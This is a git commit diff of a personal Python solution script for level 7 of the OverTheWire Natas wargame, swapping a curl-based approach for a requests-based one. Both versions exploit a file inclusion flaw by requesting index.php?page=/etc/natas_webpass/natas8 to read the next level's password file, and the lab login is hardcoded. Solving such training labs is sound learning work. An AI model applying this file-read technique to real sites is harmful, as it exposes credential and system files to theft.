6a9abdb103cfd56df774faf8aee6802f5d3e924d
vivekmaru36 <vivekmaru036@gmail.com>
2025-09-30 21:04:13 +0530

    natas7 done no need of playwright

--- scripts/natas/nlevel7.py
+++ scripts/natas/nlevel7.py
@@ -69,49 +69,82 @@
 # you can't see the br tagged password on terminal cause its php/javascript based script in use while curl just fetches html
 
 
-import subprocess
 
-import sys
+# ------------------------------------------------- Approach one
+# import subprocess
 
-import re
+# import sys
 
-def main():
+# import re
 
-    # print("i am main")
+# def main():
 
-    command=''' curl -s -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org/" '''
+#     # print("i am main")
 
-    try:
-        # spawn the shell
-        result=subprocess.run(
-            command,
-            shell=True,
-            capture_output=True,
-            text=True,
-            check=True
-        )
+#     command=''' curl -s -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" '''
 
-        if result.stdout:
-            # extract the natas 7 
-            match=re.search(r'([A-za-z0-98]+)',result.stdout)
+#     try:
+#         # spawn the shell
+#         result=subprocess.run(
+#             command,
+#             shell=True,
+#             capture_output=True,
+#             text=True,
+#             check=True
+#         )
 
-            print(result.stdout)
-            # print the stuff
-            # print(match.group(0))   
-        else :
-            print("No result found")            
+#         if result.stdout:
+#             # extract the natas 7 
+#             # match=re.search(r'([A-za-z0-98]+)',result.stdout) #/// this don't workl think long you will figure it out
+#             match=re.search(r'([A-Za-z0-9]{32})',result.stdout)  # this also just gives the pass of natas 7 we need for natas 8 that starts from letter x
+
+#             print(result.stdout)
+#             # print the stuff
+#             print(match.group(0))   
+#         else :
+#             print("No result found")            
     
-    # error handling just inm case
-    except subprocess.CalledProcessError as e:
-        print(f"Command failed with exit code {e.returncode}")
-        if e.stderr:
-            print({f"Error : {e.stderr}"})
-        sys.exit(1) # need to exit the sppwasned shell
-    except FileNotFoundError :
-        print("error curl might not be installed ...")
-        sys.exit(1)
+#     # error handling just inm case
+#     except subprocess.CalledProcessError as e:
+#         print(f"Command failed with exit code {e.returncode}")
+#         if e.stderr:
+#             print({f"Error : {e.stderr}"})
+#         sys.exit(1) # need to exit the sppwasned shell
+#     except FileNotFoundError :
+#         print("error curl might not be installed ...")
+#         sys.exit(1)
 
-if __name__=="__main__":
-    main()    
+# if __name__=="__main__":
+#     main()    
 
 
+# ------------------------------------------------- Approach two
+
+#  trying a simple approach with requests
+import requests ,re # type: ignore
+
+AUTH_USER = "natas7"
+AUTH_PASS = "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS"
+url="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
+params={
+    "page":"/etc/natas_webpass/natas8"
+}
+resp=requests.get(url,params=params,auth=(AUTH_USER,AUTH_PASS))
+
+text=resp.text
+
+# print(text)
+
+# m = re.search(r'([A-Za-z0-9]{20,40})',text) need to filter all passwords
+
+m = re.findall(r'([A-Za-z0-9]{20,40})',text)
+
+# print(m)
+
+# now filter out from m
+candidate=[ps for ps in m if ps!=AUTH_PASS ]
+
+if candidate:
+    print(f"Password for natas 8 is {candidate}")
+else :
+    print("Nope")    
